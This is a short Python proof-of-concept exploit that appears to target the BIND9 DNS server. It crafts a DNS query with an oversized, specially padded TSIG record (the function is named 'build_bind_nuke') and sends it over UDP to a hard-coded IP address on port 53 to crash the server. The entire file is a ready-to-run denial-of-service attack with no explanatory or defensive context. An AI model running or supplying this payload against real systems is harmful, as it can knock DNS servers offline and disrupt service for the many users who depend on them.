import socket
import struct

TARGET = ('192.168.200.10', 53)

Q_A = 1
Q_TSIG = 250
DNS_MESSAGE_HEADERLEN = 12


def build_bind_nuke(question="\x06google\x03com\x00", udpsize=512):
    query_A = "\x8f\x65\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01" + question + int16(Q_A) + "\x00\x01"

    sweet_spot = udpsize - DNS_MESSAGE_HEADERLEN + 1
    tsig_rr = build_tsig_rr(sweet_spot)

    return query_A + tsig_rr

def int16(n):
    return struct.pack("!H", n)

def build_tsig_rr(bind_demarshalled_size):
    signature_data = ("\x00\x00\x57\xeb\x80\x14\x01\x2c\x00\x10\xd2\x2b\x32\x13\xb0\x09"
                      "\x46\x34\x21\x39\x58\x62\xf3\xd5\x9c\x8b\x8f\x65\x00\x00\x00\x00")
    tsig_rr_extra_fields = "\x00\xff\x00\x00\x00\x00"

    necessary_bytes  = len(signature_data) + len(tsig_rr_extra_fields)
    necessary_bytes += 2 + 2 # length fields

    # from sizeof(TSIG RR) bytes conforming the TSIG RR
    # bind9 uses sizeof(TSIG RR) - 16 to build its own
    sign_name, algo_name = generate_padding(bind_demarshalled_size - necessary_bytes + 16)

    tsig_hdr = sign_name + int16(Q_TSIG) + tsig_rr_extra_fields
    tsig_data = algo_name + signature_data
    return tsig_hdr + int16(len(tsig_data)) + tsig_data

def generate_padding(n):
    max_per_bucket = [0x3f, 0x3f, 0x3f, 0x3d, 0x3f, 0x3f, 0x3f, 0x3d]
    buckets = [1] * len(max_per_bucket)

    min_size = len(buckets) * 2 + 2 # 2 bytes for every bucket plus each null byte
    max_size = sum(max_per_bucket) + len(buckets) + 2

    if not(min_size <= n <= max_size):
        raise RuntimeException("unsupported amount of bytes")

    curr_idx, n = 0, n - min_size
    while n > 0:
        next_n = max(n - (max_per_bucket[curr_idx] - 1), 0)
        buckets[curr_idx] = 1 + n - next_n
        n, curr_idx = next_n, curr_idx + 1

    n_padding = lambda amount: chr(amount) + "A" * amount
    stringify = lambda sizes: "".join(map(n_padding, sizes)) + "\x00"

    return stringify(buckets[:4]), stringify(buckets[4:])

if __name__ == "__main__":
    bombita = build_bind_nuke()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bombita, TARGET)
    s.close()

